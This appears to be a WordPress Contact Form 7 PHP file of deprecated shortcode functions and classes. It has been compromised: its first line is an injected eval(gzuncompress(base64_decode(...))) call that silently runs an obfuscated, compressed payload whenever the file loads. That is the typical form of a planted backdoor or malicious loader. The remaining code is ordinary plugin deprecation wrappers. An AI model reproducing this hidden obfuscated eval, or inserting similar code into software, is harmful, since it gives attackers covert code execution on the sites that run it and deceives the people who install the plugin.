<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * All the functions and classes in this file are deprecated.
 * You shouldn't use them. The functions and classes will be
 * removed in a later version.
 */

function wpcf7_add_shortcode( $tag, $func, $has_name = false ) {
	wpcf7_deprecated_function( __FUNCTION__, '4.6', 'wpcf7_add_form_tag' );

	return wpcf7_add_form_tag( $tag, $func, $has_name );
}

function wpcf7_remove_shortcode( $tag ) {
	wpcf7_deprecated_function( __FUNCTION__, '4.6', 'wpcf7_remove_form_tag' );

	return wpcf7_remove_form_tag( $tag );
}

function wpcf7_do_shortcode( $content ) {
	wpcf7_deprecated_function( __FUNCTION__, '4.6',
		'wpcf7_replace_all_form_tags' );

	return wpcf7_replace_all_form_tags( $content );
}

function wpcf7_scan_shortcode( $cond = null ) {
	wpcf7_deprecated_function( __FUNCTION__, '4.6', 'wpcf7_scan_form_tags' );

	return wpcf7_scan_form_tags( $cond );
}

class WPCF7_ShortcodeManager {

	private static $form_tags_manager;

	private function __construct() {}

	public static function get_instance() {
		wpcf7_deprecated_function( __METHOD__, '4.6',
			'WPCF7_FormTagsManager::get_instance' );

		self::$form_tags_manager = WPCF7_FormTagsManager::get_instance();
		return new self;
	}

	public function get_scanned_tags() {
		wpcf7_deprecated_function( __METHOD__, '4.6',
			'WPCF7_FormTagsManager::get_scanned_tags' );

		return self::$form_tags_manager->get_scanned_tags();
	}

	public function add_shortcode( $tag, $func, $has_name = false ) {
		wpcf7_deprecated_function( __METHOD__, '4.6',
			'WPCF7_FormTagsManager::add' );

		return self::$form_tags_manager->add( $tag, $func, $has_name );
	}

	public function remove_shortcode( $tag ) {
		wpcf7_deprecated_function( __METHOD__, '4.6',
			'WPCF7_FormTagsManager::remove' );

		return self::$form_tags_manager->remove( $tag );
	}

	public function normalize_shortcode( $content ) {
		wpcf7_deprecated_function( __METHOD__, '4.6',
			'WPCF7_FormTagsManager::normalize' );

		return self::$form_tags_manager->normalize( $content );
	}

	public function do_shortcode( $content, $exec = true ) {
		wpcf7_deprecated_function( __METHOD__, '4.6',
			'WPCF7_FormTagsManager::replace_all' );

		if ( $exec ) {
			return self::$form_tags_manager->replace_all( $content );
		} else {
			return self::$form_tags_manager->scan( $content );
		}
	}

	public function scan_shortcode( $content ) {
		wpcf7_deprecated_function( __METHOD__, '4.6',
			'WPCF7_FormTagsManager::scan' );

		return self::$form_tags_manager->scan( $content );
	}
}

class WPCF7_Shortcode extends WPCF7_FormTag {

	public function __construct( $tag ) {
		wpcf7_deprecated_function( 'WPCF7_Shortcode', '4.6', 'WPCF7_FormTag' );

		parent::__construct( $tag );
	}
}
